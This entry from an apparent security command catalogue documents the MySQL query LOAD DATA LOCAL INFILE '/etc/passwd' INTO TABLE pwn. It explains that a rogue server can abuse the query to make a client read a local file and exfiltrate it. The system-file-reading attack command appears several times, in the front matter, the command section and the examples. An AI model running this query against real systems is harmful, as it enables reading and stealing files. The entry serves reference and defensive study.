---
data: LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE pwn FIELDS TERMINATED BY '\n'
tags:
  - mysql
  - file-load
type: command
output: File contents loaded into table or transmitted to server
executor: sql
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:20.375Z'
id: 774b17ef-1905-456f-ad08-3720cc574273
verified: false
validated: true
submitted: true
---
# LOAD DATA LOCAL INFILE Query

## Command

```sql
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE pwn FIELDS TERMINATED BY '\n'
```

## Description

This MySQL command instructs the client to load data from a specified local file into a database table, using newline as the field terminator. In vulnerable setups, it triggers the server to send an FB packet, causing the client to read and send the file contents.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| LOCAL INFILE | Enables loading from client-side file | Yes |
| '/etc/passwd' | Path to the local file to read | Yes |
| INTO TABLE pwn | Target table for insertion | Yes |
| FIELDS TERMINATED BY '\n' | Delimiter for fields (newline) | Yes |

## Examples

### Basic Usage

```sql
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE pwn FIELDS TERMINATED BY '\n'
```

### Advanced Usage

```sql
LOAD DATA LOCAL INFILE 'sensitive.txt' INTO TABLE data FIELDS TERMINATED BY ',' ENCLOSED BY '"'
```

## Expected Output

Successful execution loads file lines as rows in the table. In exploitation, contents are exfiltrated to the rogue server instead of loading.

## Related

- [[procedures/Analyze-MySQL-LOAD-DATA-LOCAL-INFILE-Protocol-with-tcpdump]]
